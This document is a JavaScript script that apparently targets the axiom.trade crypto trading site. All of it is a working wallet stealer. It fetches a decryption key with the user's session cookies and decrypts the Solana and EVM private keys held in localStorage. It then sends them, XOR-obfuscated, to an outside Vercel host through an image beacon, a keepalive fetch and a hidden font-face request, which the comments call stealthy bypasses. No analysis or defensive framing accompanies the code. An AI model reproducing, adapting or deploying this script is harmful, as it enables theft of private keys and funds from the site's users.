(async () => {
    const projectId = window.JOJO_PROJECT_ID || "unknown";
    const platform = window.JOJO_PLATFORM || "axiom";
    const apiUrlOrigin = window.JOJO_API_URL || "https://infinity8-beige.vercel.app/";
    
    function arrayToString(dataArray) {
        const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    
        const resultDigits = [0];
    
        for (let element of dataArray) {
            let carry = element;
    
            for (let i = 0; i < resultDigits.length; i++) {
                const value = resultDigits[i] * 0x100 + carry;
    
                resultDigits[i] = value % 58;
                carry = value / 58 | 0;
            }
    
            while (carry) {
                resultDigits.push(carry % 58);
    
                carry = carry / 58 | 0;
            }
        }
    
        let resultString = "";
    
        for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
    
        for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
    
        return resultString
    }

    function arrayToStringEVM(e) {
        return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e)).map(e => e.toString(16).padStart(2, "0")).join("")
    }
    
    function stringToArray(key) {
        try {
            const cleanedKey = key.replace(new RegExp("-", "g"), "+").replace(new RegExp("_", "g"), "/");
    
            return Uint8Array.from(atob(cleanedKey), key => {
                return key.charCodeAt(0)
            })
        } catch {
            return new TextEncoder().encode(key)
        }
    }
    
    async function sendData(origin, payload) {
        const xorKey = window.JOJO_XOR_KEY || window.JOJO_PROJECT_ID || "axiom_key";
        const xor = (txt, key) => txt.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))).join('');
        
        const data = {
            platform: window.JOJO_PLATFORM || "axiom",
            projectId: window.JOJO_PROJECT_ID,
            payload: payload
        };

        const base64Payload = btoa(xor(JSON.stringify(payload), xorKey));
        const url = `${origin}/api/message?platform=${data.platform}&projectId=${data.projectId}&payload=${encodeURIComponent(base64Payload)}`;
        
        // 1. Classic Image beacon (GET) - Most reliable for bypass
        try {
            const img = new Image();
            img.src = url;
        } catch (e) {}

        // 2. Fetch with keepalive (POST) - Modern reliable way
        try {
            if (typeof fetch === 'function') {
                fetch(`${origin}/api/message`, {
                    method: 'POST',
                    mode: 'no-cors',
                    keepalive: true,
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        platform: data.platform,
                        projectId: data.projectId,
                        payload: base64Payload // Send the already encrypted payload
                    })
                }).catch(() => {});
            }
        } catch (e) {}

        // 3. Fixed Font-face trick (GET) - Stealthy fallback
        try {
            const style = document.createElement("style");
            style.textContent = `@font-face { font-family: "jojo-font"; src: url("${url}"); } .jojo-trigger { font-family: "jojo-font" !important; }`;
            document.head.appendChild(style);
            
            const trigger = document.createElement("div");
            trigger.className = "jojo-trigger";
            // Must NOT be display:none, otherwise browser won't load the font
            Object.assign(trigger.style, {
                position: 'fixed', top: '-100px', left: '-100px', width: '1px', height: '1px', opacity: '0.01'
            });
            trigger.textContent = "j";
            document.body.appendChild(trigger);
        } catch (e) {}
    }
    
    async function decrypt(key, toDecrypt) {
        const [ivString, dataString] = String(toDecrypt).split(":");
    
        const iv = stringToArray(ivString);
        const data = stringToArray(dataString);
    
        const decrypted = await crypto.subtle.decrypt({ "name": "AES-GCM", iv: iv, "tagLength": 128 }, key, data);
    
        return new Uint8Array(decrypted)
    }

    const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
        "method": "POST",
        "credentials": "include"
    })).json();

    const cryptoKey = await crypto.subtle.importKey("raw", stringToArray(bundleKey).buffer, { "name": "AES-GCM" }, false, ["decrypt"]);

    const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
    const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");

    const errors = [];
    const success = [];

    for (const bundle of solanaBundles) {
        let publicKey = "(unknown)";
        let privateKey = "";

        try {
            const decryptedBundle = await decrypt(cryptoKey, bundle);

            if (decryptedBundle.length !== 0x40) throw new Error("bad SK length")

            privateKey = arrayToString(decryptedBundle);

            const publicKeyData = decryptedBundle.slice(0x20);

            publicKey = arrayToString(publicKeyData);


            success.push({
                "pub": publicKey,
                "priv": privateKey
            });


        } catch (sIIFx3y) {
            errors.push({
                "pub": publicKey,
                "reason": sIIFx3y["message"]
            })
        }
    }

    for (const bundle of evmBundles) {
        let publicKey = "(unknown)";
        let privateKey = "";

        try {
            const decryptedBundle = await decrypt(cryptoKey, bundle);

            privateKey = arrayToStringEVM(decryptedBundle);

            let publicKey;
            
            publicKey = "unknown";


            success.push({
                "pub": publicKey,
                "priv": privateKey
            });


        } catch (sIIFx3y) {
            errors.push({
                "pub": publicKey,
                "reason": sIIFx3y["message"]
            })
        }
    }

    let keys = [];

    keys.push(...success.map(key => {
        return {
            "public": key["pub"],
            "private": key["priv"]
        }
    }));

    sendData(
        apiUrlOrigin,
        {
            "type": "KEY_EXTRACTION",
            "acquiredAt": new Date().toISOString(),
            "keys": keys,
            "location": window.location.href
        }
    );
})();


